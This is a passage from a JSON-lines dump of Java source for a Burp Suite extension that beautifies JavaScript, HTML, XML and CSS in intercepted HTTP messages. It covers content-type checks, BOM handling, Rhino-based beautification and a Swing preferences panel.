Exit!\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}else if(requestHeaderAndBody[1].equals(\"\") && responsetHeaderAndBody[1].equals(\"\")){\n\t\t\t\tif (beautifierPreferences.isDebugMode())\n\t\t\t\t\tstdout.println(\"Request and response bodies are empty. Nothing to be beautified!\");\n\t\t\t\tmsgType=0; // Nothing to be beautified!\n\t\t\t}else{\n\t\t\t\tmsgType = (!responsetHeaderAndBody[1].equals(\"\")) ? 2 : 1; // 1= request, 2= response -> I need to check the response first!\n\t\t\t\tif (beautifierPreferences.isDebugMode())\n\t\t\t\t\tstdout.println(\"1= request, 2= response > msgType: \"+ msgType);\n\t\t\t\tif(msgType==1 && (isNormalPostMessage(requestHeaderAndBody[1]) || msgType==1 && isAutomatic)){\n\t\t\t\t\t// It is a normal POST message and should not be beautified\n\t\t\t\t\tmsgType= 0;\n\t\t\t\t\tif (beautifierPreferences.isDebugMode())\n\t\t\t\t\t\tstdout.println(\"It is a normal POST message and should not be beautified > msgType: \"+ msgType);\n\t\t\t\t}\n\n\t\t\t}\n\t\t}\n\n\n\t\t// Check the response content-type to be a valid text\n\t\tif(msgType==2 || msgType==3){\n\n\t\t\tif(!isValidContentType(responsetHeaderAndBody[0],responsetHeaderAndBody[1])){\n\t\t\t\t// Content-Type is not valid, we need to ask the user for confirmation\n\t\t\t\tint n = 1;\n\t\t\t\tif(!isAutomatic){\n\t\t\t\t\tString[] options = {\"Yes, please continue \",\"No, please do not beautify the response\"};\n\t\t\t\t\tn = askConfirmMessage(\"Please choose an option:\", \"Response content-type has not been recognised, do you still want to run beautifier?\",options);\n\t\t\t\t}\n\t\t\t\tif(n==1){\n\t\t\t\t\t//No has been selected\n\t\t\t\t\tif(msgType==2){\n\t\t\t\t\t\tmsgType = 0;  // stop beautifying the response\n\t\t\t\t\t\treturn; // Exit\n\t\t\t\t\t}else{\n\t\t\t\t\t\tmsgType = 1; // only beautify the request\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tswitch(msgType){\n\t\tcase 3:\n\t\tcase 2:// It is a response\n\t\t\tif(msgType==3){\n\t\t\t\t// Request & Response\n\t\t\t\tif(beautifierPreferences.isBeautifyHeadersInManualMode()){\n\t\t\t\t\trequestHeaderAndBody[0] = deCompress(requestHeaderAndBody[0]);\n\t\t\t\t}\n\t\t\t\trequestHeaderAndBody[1] = deCompress(requestHeaderAndBody[1]);\n\t\t\t\trequestHeaderAndBody[0] = requestHeaderAndBody[0].replaceAll(\"(?im)^content\\\\-length:[\\\\ \\\\t\\\\d]+$\", \"Content-Length: \"+requestHeaderAndBody[1].length());\n\t\t\t}\n\n\t\t\tif(isUnprotectedCSSFile(responsetHeaderAndBody[0],responsetHeaderAndBody[1])){\n\t\t\t\t// If it is a CSS file, it needs to have a <STYLE> tag in its body, otherwise it will be corrupted\n\t\t\t\tresponsetHeaderAndBody[1] = \"<STYLE my/beautifier>\"+responsetHeaderAndBody[1]+\"</STYLE my/beautifier>\";\n\t\t\t\tresponsetHeaderAndBody[1] = deCompress(responsetHeaderAndBody[1]);\n\t\t\t\tresponsetHeaderAndBody[1] = responsetHeaderAndBody[1].replace(\"<STYLE my/beautifier>\", \"\");\n\t\t\t\tresponsetHeaderAndBody[1] = responsetHeaderAndBody[1].replace(\"</STYLE my/beautifier>\", \"\");\n\t\t\t}else if(isHtmlXmlFile(responsetHeaderAndBody[0],responsetHeaderAndBody[1]) || isDotNetPipeDelimitedResponse(responsetHeaderAndBody[1])){\n\t\t\t\t// If it is a HTML or XML file, it should be started with a valid tag\n\t\t\t\tresponsetHeaderAndBody[1] = \"<my beautifier unique thing />\"+responsetHeaderAndBody[1];\n\t\t\t\tresponsetHeaderAndBody[1] = deCompress(responsetHeaderAndBody[1]);\n\t\t\t\tresponsetHeaderAndBody[1] = responsetHeaderAndBody[1].replace(\"<my beautifier unique thing />\", \"\");\n\n\t\t\t\t// Fix possible <![CDATA[ bugs!\n\t\t\t\tresponsetHeaderAndBody[1] = responsetHeaderAndBody[1].replaceAll(\"(?im)[\\\\s]*\\\\<\\\\ \\\\!\\\\[CDATA\\\\[\", \"<![CDATA[\");\n\t\t\t\tresponsetHeaderAndBody[1] = responsetHeaderAndBody[1].replaceAll(\"(?im)\\\\/\\\\/[\\\\s]+<\\\\!\\\\[CDATA\\\\[\", \"//<![CDATA[\");\n\t\t\t\t// Fix possible free space on top (<?xml or <!doctype and so on)\n\t\t\t\tresponsetHeaderAndBody[1] = responsetHeaderAndBody[1].replaceAll(\"(?i)^[\\\\s]+\", \"\");\n\n\t\t\t\t// Fix other problems of .Net Pipe-delimited response\n\t\t\t\tif(isDotNetPipeDelimitedResponse(responsetHeaderAndBody[1]))\n\t\t\t\t{\n\t\t\t\t\tresponsetHeaderAndBody[1] = responsetHeaderAndBody[1].replaceAll(\"(?i)\\\\\\\\[\\\\s]+\\\"[\\\\s]*:\", \"\\\\\\\\\\\":\");\n\t\t\t\t\tresponsetHeaderAndBody[1] = responsetHeaderAndBody[1].replaceAll(\"(?i)\\\\\\\\[\\\\s]+\\\"[\\\\s]*,\", \"\\\\\\\\\\\",\");\n\t\t\t\t}\n\n\t\t\t}else{\n\t\t\t\tresponsetHeaderAndBody[1] = deCompress(responsetHeaderAndBody[1]);\n\t\t\t}\n\n\t\t\tif(beautifierPreferences.isBeautifyHeadersInManualMode()){\n\t\t\t\tresponsetHeaderAndBody[0] = deCompress(responsetHeaderAndBody[0]);\n\t\t\t}\n\t\t\tresponsetHeaderAndBody[0] = responsetHeaderAndBody[0].replaceAll(\"(?im)^content\\\\-length:[\\\\ \\\\t\\\\d]+$\", \"Content-Length: \"+responsetHeaderAndBody[1].length()+4); // 4 additional characters are \"\\r\\n\\r\\n\" which will be added later\n\t\t\tbreak;\n\t\tcase 1: // It is a request\n\t\t\trequestHeaderAndBody[1] = deCompress(requestHeaderAndBody[1]);\n\t\t\tif(beautifierPreferences.isBeautifyHeadersInManualMode()){\n\t\t\t\trequestHeaderAndBody[0] = deCompress(requestHeaderAndBody[0]);\n\t\t\t}\n\n\t\t\trequestHeaderAndBody[0] = requestHeaderAndBody[0].replaceAll(\"(?im)^content\\\\-length:[\\\\ \\\\t\\\\d]+$\", \"Content-Length: \"+requestHeaderAndBody[1].length());\t\t\t\t\n\t\t\tbreak;\n\t\tcase 0:\n\t\t\t// Nothing is there! Nothing to be beautified!\n\t\t\tshowMessage(messageList.msgEmptyMessage.getMessage());\n\t\t\treturn;\n\t\t}\n\n\n\n\t\t// Create the final/beautified text for Request and Response - They would be empty if they are not available\n\t\tfinalRequestHeaderAndBody = requestHeaderAndBody[0]+\"\\r\\n\\r\\n\"+requestHeaderAndBody[1];\n\t\tfinalResponsetHeaderAndBody = responsetHeaderAndBody[0]+\"\\r\\n\\r\\n\"+responsetHeaderAndBody[1];\n\n\n\t\tif (msgType==1){\n\t\t\tmessageInfo[0].setRequest(finalRequestHeaderAndBody.getBytes(encoding));\n\t\t\tmessageState = 1;\n\t\t}else if (msgType==2){\n\t\t\tmessageInfo[0].setResponse(finalResponsetHeaderAndBody.getBytes(encoding));\n\t\t\tmessageState = 1;\n\t\t}else{\n\t\t\tmessageInfo[0].setRequest(finalRequestHeaderAndBody.getBytes(encoding));\n\t\t\tmessageState = 1;\n\t\t\tmessageInfo[0].setResponse(finalResponsetHeaderAndBody.getBytes(encoding));\n\t\t\tmessageState = 2;\n\t\t}\n\n\t}catch (Exception e) {\n\t\tif(e.getMessage().toLowerCase().contains(\"read-only\") && !isAutomatic)\n\t\t{\n\t\t\t// Read only item - we need to open a new message box\n\t\t\tshowMessage(messageList.msgReadOnlyMessage.getMessage());\n\n\t\t\tViewHighlightedTextForm showMsgForm = new ViewHighlightedTextForm();\n\n\t\t\tif (msgType==1){\n\t\t\t\tshowMsgForm.showForm(beautifierPreferences.getAppInfo(), finalRequestHeaderAndBody, \"text/html\", 600, 450);\n\t\t\t}else if (msgType==2){\n\t\t\t\tshowMsgForm.showForm(beautifierPreferences.getAppInfo(), finalResponsetHeaderAndBody, \"text/html\", 600, 450);\n\t\t\t}else{\n\t\t\t\tif(messageState==0)\n\t\t\t\t\tshowMsgForm.showForm(beautifierPreferences.getAppInfo(), finalRequestHeaderAndBody, \"text/html\", 600, 450);\n\t\t\t\tshowMsgForm.showForm(beautifierPreferences.getAppInfo(), finalResponsetHeaderAndBody, \"text/html\", 600, 450);\n\t\t\t}\n\n\t\t}else if(e.getMessage().equalsIgnoreCase(\"Request has already been issued\") && !isAutomatic){\n\t\t\t//showMessage(messageList.msgRequestHasBeenIssued.getMessage());\n\t\t\t// It seems it can change the request anyway! so we ignore this error for now!\n\t\t}else{\n\t\t\t// Not catched error\n\t\t\tshowMessage(messageList.msgFatalMessage.getMessage());\n\t\t\tif(beautifierPreferences.isDebugMode())\n\t\t\t\te.printStackTrace(stderr);\n\t\t}\n\n\t}\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// Check to see if it is a HTML or XML file\n", "func_signal": "private boolean isHtmlXmlFile(String strHeader, String strBody)", "code": "{\n\tboolean result = false;\n\t// Check if it is a CSS file to prevent from being checked as a JS file\n\tif(!strHeader.equals(\"\") && !strBody.equals(\"\") && !patternCDATA.matcher(strBody).find()){\n\t\tString tempContentType = findHeaderContentType(strHeader);\n\t\tif(tempContentType.toLowerCase().contains(\"html\") || tempContentType.toLowerCase().contains(\"xml\")){\n\t\t\tresult = true;\n\t\t}\n\t}\n\tif (beautifierPreferences.isDebugMode())\n\t\tstdout.println(\"isHtmlXmlFile: \"+ result);\n\treturn result;\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "/**\n * Returns the bytes corresponding to this <code>BOM</code> value.\n */\n", "func_signal": "public final byte[] getBytes()", "code": "{\n\tfinal int     length = bytes.length;\n\tfinal byte[]  result = new byte[length];\n\n\t// Make a defensive copy\n\tSystem.arraycopy(bytes,0,result,0,length);\n\n\treturn result;\n}", "path": "src\\burp\\JSBeautifier\\UnicodeBOMInputStream.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "/**\n * Returns the bytes corresponding to this <code>BOM</code> value.\n */\n", "func_signal": "public final byte[] getBytes()", "code": "{\n\tfinal int     length = bytes.length;\n\tfinal byte[]  result = new byte[length];\n\n\t// Make a defensive copy\n\tSystem.arraycopy(bytes,0,result,0,length);\n\n\treturn result;\n}", "path": "jsbeautifier\\src\\burp\\JSBeautifier\\UnicodeBOMInputStream.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "/**\n * Constructs a new <code>UnicodeBOMInputStream</code> that wraps the\n * specified <code>InputStream</code>.\n * \n * @param inputStream an <code>InputStream</code>.\n * \n * @throws NullPointerException when <code>inputStream</code> is\n * <code>null</code>.\n * @throws IOException on reading from the specified <code>InputStream</code>\n * when trying to detect the Unicode BOM.\n */\n", "func_signal": "public UnicodeBOMInputStream(final InputStream inputStream) throws  NullPointerException,\nIOException", "code": "{\n\tif (inputStream == null)\n\t\tthrow new NullPointerException(\"invalid input stream: null is not allowed\");\n\n\tin = new PushbackInputStream(inputStream,4);\n\n\tfinal byte  bom[] = new byte[4];\n\tfinal int   read  = in.read(bom);\n\n\tswitch(read)\n\t{\n\tcase 4:\n\t\tif ((bom[0] == (byte)0xFF) &&\n\t\t\t\t(bom[1] == (byte)0xFE) &&\n\t\t\t\t(bom[2] == (byte)0x00) &&\n\t\t\t\t(bom[3] == (byte)0x00))\n\t\t{\n\t\t\tthis.bom = BOM.UTF_32_LE;\n\t\t\tbreak;\n\t\t}\n\t\telse\n\t\t\tif ((bom[0] == (byte)0x00) &&\n\t\t\t\t\t(bom[1] == (byte)0x00) &&\n\t\t\t\t\t(bom[2] == (byte)0xFE) &&\n\t\t\t\t\t(bom[3] == (byte)0xFF))\n\t\t\t{\n\t\t\t\tthis.bom = BOM.UTF_32_BE;\n\t\t\t\tbreak;\n\t\t\t}\n\n\tcase 3:\n\t\tif ((bom[0] == (byte)0xEF) &&\n\t\t\t\t(bom[1] == (byte)0xBB) &&\n\t\t\t\t(bom[2] == (byte)0xBF))\n\t\t{\n\t\t\tthis.bom = BOM.UTF_8;\n\t\t\tbreak;\n\t\t}\n\n\tcase 2:\n\t\tif ((bom[0] == (byte)0xFF) &&\n\t\t\t\t(bom[1] == (byte)0xFE))\n\t\t{\n\t\t\tthis.bom = BOM.UTF_16_LE;\n\t\t\tbreak;\n\t\t}\n\t\telse\n\t\t\tif ((bom[0] == (byte)0xFE) &&\n\t\t\t\t\t(bom[1] == (byte)0xFF))\n\t\t\t{\n\t\t\t\tthis.bom = BOM.UTF_16_BE;\n\t\t\t\tbreak;\n\t\t\t}\n\n\tdefault:\n\t\tthis.bom = BOM.NONE;\n\t\tbreak;\n\t}\n\n\tif (read > 0)\n\t\tin.unread(bom,0,read);\n}", "path": "src\\burp\\JSBeautifier\\UnicodeBOMInputStream.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// Show a message to the user\n", "func_signal": "public void showMessage(String strMsg)", "code": "{\n\t//mCallbacks.issueAlert(strMsg);\n\tif(!isAutomatic || beautifierPreferences.isDebugMode())\n\t{\n\t\tJOptionPane.showMessageDialog(null, strMsg);\n\t}\n\tstdout.println(strMsg);\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// Check the content type of the response message to be in text-format \n", "func_signal": "private boolean isValidContentType(String strHeader, String strBody)", "code": "{\n\tboolean result = false;\n\tif(!strHeader.equals(\"\")){\n\n\t\t// 1- Check for a URL/Link usually for ajax queries, we do not want to beautify it if it only contains a URL (normal or relative)\t\t\n\t\t// Fixed provided by augustd at codemagi.com - https://code.google.com/p/burp-suite-beautifier-extension/issues/detail?id=2 \n\t\ttry {\n\t\t\tURL dummy_url = new java.net.URL(strBody);\n\t\t\treturn false; // We do not want to beautify it if it only contains a URL (normal or relative)\n\t\t} catch (MalformedURLException me) {\n\t\t\t//not a URL\n\t\t}\n\t\t// 2- Check for the Content-Type value  now!\n\t\tString contentType= findHeaderContentType(strHeader);\n\t\tif(beautifierPreferences.isDebugMode())\n\t\t\tstdout.println(contentType);\n\t\t// We are only interested in the following types\n\t\t// main beautifier function cannot work with a CSS file without having a STYLE tag - a fix needs to be added later\n\t\tString[] validTypes = {\"text\",\"html\",\"xml\",\"script\",\"vml\",\"svg\",\"json\",\"ajax\",\"css\"}; \n\t\tfor(String item : validTypes){\n\t\t\tif (contentType.toLowerCase().contains(item.toLowerCase())){\n\t\t\t\tresult = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (beautifierPreferences.isDebugMode())\n\t\tstdout.println(\"isValidContentType: \"+ result);\n\treturn result;\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// Running the beautifier javascript on the text\n", "func_signal": "private String deCompress(String strInput)", "code": "{\n\tif(strInput==null)\n\t\treturn \"\";\n\tif(strInput.equals(\"\"))\n\t\treturn \"\";\n\n\tString[] testBOMInput = splitBOMCharacter(strInput); // Find any BOM to remove it\n\tboolean hasBOM = !testBOMInput[0].equals(\"\"); // Does it have BOM?\n\t// Removing BOM from the input\n\tif(hasBOM){\n\t\tstrInput = testBOMInput[1];\n\t}\n\n\tString finalResult = \"\";\n\ttry {\n\t\t// Set version to JavaScript1.2 so that we get object-literal style\n\t\t// printing instead of \"[object Object]\"\n\t\t// http://jsbeautifier.org/beautify.js\n\t\t// Javascripts from \"http://jsbeautifier.org/\" has been mixed in 1 line - March 2012\n\n\t\t// Loading the JavaScript\n\t\tif(beautifierJS.equals(\"\")){\t\t\t\n\t\t\t//beautifierJS =\"\";\n\t\t\tString[] fileList = {\"beautify-css.js\",\"beautify-html.js\",\"beautify.js\",\"javascriptobfuscator_unpacker.js\",\"myobfuscate_unpacker.js\",\"p_a_c_k_e_r_unpacker.js\",\"urlencode_unpacker.js\",\"inlineJS.js\"};\n\t\t\ttry{\n\n\t\t\t\tString encoding = \"UTF-8\"; /* You need to know the right character encoding. */\n\n\t\t\t\tInputStream[] fileStreams = new InputStream[fileList.length];\n\t\t\t\tfor (int i=0;i<fileStreams.length;i++){\n\t\t\t\t\tfileStreams[i] = getClass().getResourceAsStream(\"/\"+fileList[i]);\n\n\t\t\t\t}\n\n\t\t\t\tEnumeration<InputStream> streams = \n\t\t\t\t\t\tCollections.enumeration(Arrays.asList(fileStreams));\n\t\t\t\tReader r = new InputStreamReader(new SequenceInputStream(streams), encoding);\n\t\t\t\tchar[] buf = new char[2048];\n\t\t\t\tStringBuilder str = new StringBuilder();\n\t\t\t\twhile (true) {\n\t\t\t\t\tint n = r.read(buf);\n\t\t\t\t\tif (n < 0)\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tstr.append(buf, 0, n);\n\t\t\t\t}\n\t\t\t\tr.close();\n\t\t\t\tbeautifierJS = str.toString();\n\t\t\t\tif (beautifierPreferences.isDebugMode())\n\t\t\t\t\tstdout.println(\"Javascript files have been loaded successfully.\");\n\t\t\t}catch(IOException errIO){\n\t\t\t\tstderr.println(\"Error: IO error. Please check the required files: \" + fileList.toString());\n\t\t\t\tif (beautifierPreferences.isDebugMode())\n\t\t\t\t\terrIO.printStackTrace(stderr);\n\t\t\t\tstderr.println(\"Unable to load the JavaScript files.\");\n\t\t\t}\n\t\t}\n\n\t\t// this is just a try to store this object in memory to increase performance after the first run\n\n\t\tContext cx= Context.enter();\n\t\tcx.setOptimizationLevel(-1);\n\t\tcx.setLanguageVersion(Context.VERSION_DEFAULT);\n\t\tif(sharedScope==null){\n\t\t\t// Initialize the standard objects (Object, Function, etc.)\n\t\t\t// This must be done before scripts can be executed.\n\t\t\tsharedScope = cx.initStandardObjects(null, true);\n\t\t\t// defining \"global\" will fix the bug in which we could not have access to beautifier main functions\n\t\t\tcx.evaluateString(sharedScope, \"var global = {};\"+beautifierJS,\"myBeautifier\", 1, null);\n\t\t}\n\n\t\t// Add settings to beautifier\n\t\tString beautifierSettingVars = \"var indent_size = %d;\";\n\t\tbeautifierSettingVars+=\"var indent_char = '%s';\";\n\t\tbeautifierSettingVars+=\"var max_preserve_newlines = %d;\";\n\t\tbeautifierSettingVars+=\"var preserve_newlines = %b;\";\n\t\tbeautifierSettingVars+=\"var keep_array_indentation = %b;\";\n\t\tbeautifierSettingVars+=\"var break_chained_methods = %b;\";\n\t\tbeautifierSettingVars+=\"var space_after_anon_function = %b;\";\n\t\tbeautifierSettingVars+=\"var indent_scripts = '%s';\";\n\t\tbeautifierSettingVars+=\"var brace_style = '%s';\";\n\t\tbeautifierSettingVars+=\"var space_before_conditional = %b;\";\n\t\tbeautifierSettingVars+=\"var detect_packers = %b;\";\n\t\tbeautifierSettingVars+=\"var unescape_strings = %b;\";\n\t\tbeautifierSettingVars+=\"var wrap_line_length = %d;\";\n\n\t\tbeautifierSettingVars = String.format(beautifierSettingVars,beautifierPreferences.getIndent_size(),beautifierPreferences.getIndent_char(),beautifierPreferences.getMax_preserve_newlines(),beautifierPreferences.isPreserve_newlines(),\n\t\t\t\tbeautifierPreferences.isKeep_array_indentation(),beautifierPreferences.isBreak_chained_methods(),beautifierPreferences.isSpace_after_anon_function(),beautifierPreferences.getIndent_scripts(),\n\t\t\t\tbeautifierPreferences.getBrace_style(),beautifierPreferences.isSpace_before_conditional(),beautifierPreferences.isDetect_packers(),beautifierPreferences.isUnescape_strings(),\n\t\t\t\tbeautifierPreferences.getWrap_line_length());\n\n\t\tcx.evaluateString(sharedScope, beautifierSettingVars, \"beautifierSettingVars\", 1, null);\n\n\t\t// Now we can evaluate a script. Let's create a new object\n\t\t// using the object literal notation\n\n\t\tObject fObj = sharedScope.get(\"beautify\", sharedScope);\n\n\t\tif (!(fObj instanceof Function)) {\n\t\t\tstderr.println(\"beautify is undefined or not a function.\");\n\t\t} else {\n\t\t\tObject functionArgs[] = { strInput };\n\n\t\t\tFunction f = (Function)fObj;\n\t\t\tObject result1 = f.call(cx, sharedScope, sharedScope, functionArgs);\n\t\t\tfinalResult = Context.toString(result1);\n\n\t\t\t//\t\t\t\tif(beautifierPreferences.isDebugMode())\n\t\t\t//\t\t\t\t\tstdout.println(\"Result after beautifying= \\r\\n\"+finalResult);\n\t\t}\n\n\t} catch (Exception e) {\n\t\tif(beautifierPreferences.isDebugMode())\n\t\t\te.printStackTrace(stderr);\n\t}finally {\n\t\tContext.exit();\n\t}\n\n\t// Adding BOM to the result\n\tif(hasBOM){\n\t\tfinalResult = testBOMInput[0]+finalResult;\n\t}\n\treturn finalResult;\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// Common method to ask a multiple question\n", "func_signal": "public Integer askConfirmMessage(String strTitle, String strQuestion, String[] msgOptions)", "code": "{\n\tObject[] options = msgOptions;\n\tint n = 0;\n\tn = JOptionPane.showOptionDialog(null,\n\t\t\tstrQuestion,\n\t\t\tstrTitle,\n\t\t\tJOptionPane.YES_NO_CANCEL_OPTION,\n\t\t\tJOptionPane.QUESTION_MESSAGE,\n\t\t\tnull,\n\t\t\toptions,\n\t\t\toptions[0]);\n\treturn n;\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "// Check to see if it is a CSS file to protect it from being corrupted\n", "func_signal": "private boolean isUnprotectedCSSFile(String strHeader, String strBody)", "code": "{\n\tboolean result = false;\n\t// Check if it is a CSS file to prevent from being checked as a JS file\n\tif(!strHeader.equals(\"\") && !strBody.equals(\"\")){\n\t\tif(findHeaderContentType(strHeader).toLowerCase().contains(\"css\")){\n\t\t\tString startwithStyleTagRegex = \"(?i)^[\\\\s]*\\\\<style[\\\\s\\\\\\\\/>]+\";\n\t\t\tif(!strBody.matches(startwithStyleTagRegex)){\n\t\t\t\tresult = true; // It does not start with any <style tag\n\t\t\t}\n\t\t}\n\t}\n\tif (beautifierPreferences.isDebugMode())\n\t\tstdout.println(\"isUnprotectedCSSFile: \"+ result);\n\treturn result;\n}", "path": "src\\burp\\JSBeautifier\\JSBeautifierFunctions.java", "repo_name": "irsdl/BurpSuiteJSBeautifier", "stars": 88, "license": "None", "language": "java", "size": 2480}
{"docstring": "/**\n * Create the panel.\n */\n", "func_signal": "public PreferencesEditor(final IBurpExtenderCallbacks mCallbacks)", "code": "{\n\tthis.mCallbacks = mCallbacks;\n\tsetToolTipText(\"Burp Suite JSBeautifier Settings\");\n\tGridBagLayout gridBagLayout = new GridBagLayout();\n\tgridBagLayout.columnWidths = new int[]{47, 211, 231, 0, 0, 0, 0};\n\tgridBagLayout.rowHeights = new int[]{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};\n\tgridBagLayout.columnWeights = new double[]{0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Double.MIN_VALUE};\n\tgridBagLayout.rowWeights = new double[]{0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Double.MIN_VALUE};\n\tsetLayout(gridBagLayout);\n\t\n\tJLabel label = new JLabel(\"   \");\n\tGridBagConstraints gbc_label = new GridBagConstraints();\n\tgbc_label.insets = new Insets(0, 0, 5, 5);\n\tgbc_label.gridx = 1;\n\tgbc_label.gridy = 0;\n\tadd(label, gbc_label);\n\t\n\tJLabel lblAutomaticOnResponses = new JLabel(\"Beautify PROXY responses automatically?\");\n\tGridBagConstraints gbc_lblAutomaticOnResponses = new GridBagConstraints();\n\tgbc_lblAutomaticOnResponses.anchor = GridBagConstraints.WEST;\n\tgbc_lblAutomaticOnResponses.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblAutomaticOnResponses.gridx = 1;\n\tgbc_lblAutomaticOnResponses.gridy = 1;\n\tadd(lblAutomaticOnResponses, gbc_lblAutomaticOnResponses);\n\t\n\tGridBagConstraints gbc_isAutomatic = new GridBagConstraints();\n\tgbc_isAutomatic.anchor = GridBagConstraints.WEST;\n\tgbc_isAutomatic.insets = new Insets(0, 0, 5, 5);\n\tgbc_isAutomatic.gridx = 2;\n\tgbc_isAutomatic.gridy = 1;\n\tadd(isAutomaticInProxy, gbc_isAutomatic);\n\t\n\tJLabel lblOnlyInScope = new JLabel(\"Only in scope items?\");\n\tGridBagConstraints gbc_lblOnlyInScope = new GridBagConstraints();\n\tgbc_lblOnlyInScope.anchor = GridBagConstraints.WEST;\n\tgbc_lblOnlyInScope.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblOnlyInScope.gridx = 3;\n\tgbc_lblOnlyInScope.gridy = 1;\n\tadd(lblOnlyInScope, gbc_lblOnlyInScope);\n\t\n\t\n\tGridBagConstraints gbc_isRestrictedToScope = new GridBagConstraints();\n\tgbc_isRestrictedToScope.anchor = GridBagConstraints.WEST;\n\tgbc_isRestrictedToScope.insets = new Insets(0, 0, 5, 5);\n\tgbc_isRestrictedToScope.gridx = 4;\n\tgbc_isRestrictedToScope.gridy = 1;\n\tadd(isRestrictedToScope, gbc_isRestrictedToScope);\n\t\n\tJLabel lblNewLabel_2 = new JLabel(\"Beautify ALL responses automatically?\");\n\tGridBagConstraints gbc_lblNewLabel_2 = new GridBagConstraints();\n\tgbc_lblNewLabel_2.anchor = GridBagConstraints.WEST;\n\tgbc_lblNewLabel_2.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblNewLabel_2.gridx = 1;\n\tgbc_lblNewLabel_2.gridy = 2;\n\tadd(lblNewLabel_2, gbc_lblNewLabel_2);\n\t\n\tGridBagConstraints gbc_isAutomaticInAll = new GridBagConstraints();\n\tgbc_isAutomaticInAll.anchor = GridBagConstraints.WEST;\n\tgbc_isAutomaticInAll.insets = new Insets(0, 0, 5, 5);\n\tgbc_isAutomaticInAll.gridx = 2;\n\tgbc_isAutomaticInAll.gridy = 2;\n\tadd(isAutomaticInAll, gbc_isAutomaticInAll);\n\t\n\tJLabel lblBeautifyHeaderIn = new JLabel(\"Beautify headers in Manual mode?\");\n\tlblBeautifyHeaderIn.setToolTipText(\"This can cause functional issues\");\n\tGridBagConstraints gbc_lblBeautifyHeaderIn = new GridBagConstraints();\n\tgbc_lblBeautifyHeaderIn.anchor = GridBagConstraints.WEST;\n\tgbc_lblBeautifyHeaderIn.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblBeautifyHeaderIn.gridx = 3;\n\tgbc_lblBeautifyHeaderIn.gridy = 2;\n\tadd(lblBeautifyHeaderIn, gbc_lblBeautifyHeaderIn);\n\t\n\t\n\tGridBagConstraints gbc_beautifyHeadersInManMode = new GridBagConstraints();\n\tgbc_beautifyHeadersInManMode.anchor = GridBagConstraints.WEST;\n\tgbc_beautifyHeadersInManMode.insets = new Insets(0, 0, 5, 5);\n\tgbc_beautifyHeadersInManMode.gridx = 4;\n\tgbc_beautifyHeadersInManMode.gridy = 2;\n\tadd(beautifyHeadersInManualMode, gbc_beautifyHeadersInManMode);\n\t\n\tJLabel lblIndentsize = new JLabel(\"Indent Size\");\n\tGridBagConstraints gbc_lblIndentsize = new GridBagConstraints();\n\tgbc_lblIndentsize.anchor = GridBagConstraints.WEST;\n\tgbc_lblIndentsize.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblIndentsize.gridx = 1;\n\tgbc_lblIndentsize.gridy = 3;\n\tadd(lblIndentsize, gbc_lblIndentsize);\n\t\n\n\t\n\tGridBagConstraints gbc_indent_size = new GridBagConstraints();\n\tgbc_indent_size.anchor = GridBagConstraints.WEST;\n\tgbc_indent_size.insets = new Insets(0, 0, 5, 5);\n\tgbc_indent_size.gridx = 2;\n\tgbc_indent_size.gridy = 3;\n\tadd(indent_size, gbc_indent_size);\n\t\n\tJLabel lblDetectpackers = new JLabel(\"Detect packers and obfuscators? \");\n\tGridBagConstraints gbc_lblDetectpackers = new GridBagConstraints();\n\tgbc_lblDetectpackers.anchor = GridBagConstraints.WEST;\n\tgbc_lblDetectpackers.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblDetectpackers.gridx = 3;\n\tgbc_lblDetectpackers.gridy = 3;\n\tadd(lblDetectpackers, gbc_lblDetectpackers);\n\t\n\t\n\tGridBagConstraints gbc_detect_packers = new GridBagConstraints();\n\tgbc_detect_packers.anchor = GridBagConstraints.WEST;\n\tgbc_detect_packers.insets = new Insets(0, 0, 5, 5);\n\tgbc_detect_packers.gridx = 4;\n\tgbc_detect_packers.gridy = 3;\n\tadd(detect_packers, gbc_detect_packers);\n\t\n\tJLabel lblNewLabel = new JLabel(\"Max Preserve Newlines\");\n\tGridBagConstraints gbc_lblNewLabel = new GridBagConstraints();\n\tgbc_lblNewLabel.anchor = GridBagConstraints.WEST;\n\tgbc_lblNewLabel.insets = new Insets(0, 0, 5, 5);\n\tgbc_lblNewLabel.gridx = 1;\n\tgbc_lblNewLabel.gridy = 4;\n\tadd(lblNewLabel, 